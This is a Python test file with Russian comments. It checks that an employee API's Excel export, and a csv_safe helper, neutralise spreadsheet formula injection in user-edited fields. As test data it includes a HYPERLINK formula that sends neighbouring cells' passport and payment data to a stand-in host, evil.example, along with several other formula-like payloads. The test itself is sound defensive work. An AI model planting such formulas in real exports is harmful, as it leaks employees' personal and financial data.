"""Сторож: выгрузка сотрудников в Excel не исполняет формулы из их данных.

Сотрудник сам правит должность, телефон и extra_data (адрес, реквизиты) через
PUT /employees/me. Строка на «=» уходила в xlsx формулой: `=HYPERLINK(…&J2&K2…)`
в выгрузке админа отправлял наружу паспорта и реквизиты соседних строк
(до 27.10.2026).
"""
import io

from openpyxl import load_workbook

from api.models.database import Employee, OrgMember, OrgRole
from api.services.auth import create_access_token


def _h(user):
    return {"Authorization": f"Bearer {create_access_token({'sub': str(user.id)})}"}


async def test_formula_like_values_exported_as_text(
    client, db_session, organization, org_owner, admin_user, second_user,
):
    db_session.add(OrgMember(org_id=organization.id, user_id=second_user.id, role=OrgRole.member))
    evil = '=HYPERLINK("https://evil.example/?d="&J3&L3,"Подробнее")'
    db_session.add(Employee(
        user_id=second_user.id, org_id=organization.id, is_active=True,
        position="@SUM(1+1)", phone="+7 (999) 123-45-67",
        extra_data={"address": evil, "payment_details": "-2+3"},
    ))
    await db_session.commit()

    resp = await client.get("/api/employees/import-template?filled=1", headers=_h(admin_user))

    assert resp.status_code == 200
    ws = load_workbook(io.BytesIO(resp.content))["Сотрудники"]
    cells = [c for row in ws.iter_rows(min_row=2) for c in row if c.value not in (None, "")]
    assert cells, "выгрузка пустая"
    assert all(c.data_type != "f" for c in cells), [c.coordinate for c in cells if c.data_type == "f"]
    values = {c.value for c in cells}
    assert evil in values  # текст сохранён как есть
    assert "+7 (999) 123-45-67" in values  # телефон без апострофа


def test_csv_safe_blocks_formulas_keeps_phones():
    from api.utils.csv_safe import csv_safe

    for evil in ('=HYPERLINK("x")', "@SUM(1)", "+HYPERLINK(1)", "-2+3", "\t=1"):
        assert csv_safe(evil).startswith("'"), evil
    for plain in ("+7 (999) 123-45-67", "-1500.50", "Иванов", "", 42):
        assert csv_safe(plain) == ("" if plain == "" else str(plain))
    assert csv_safe(None) == ""
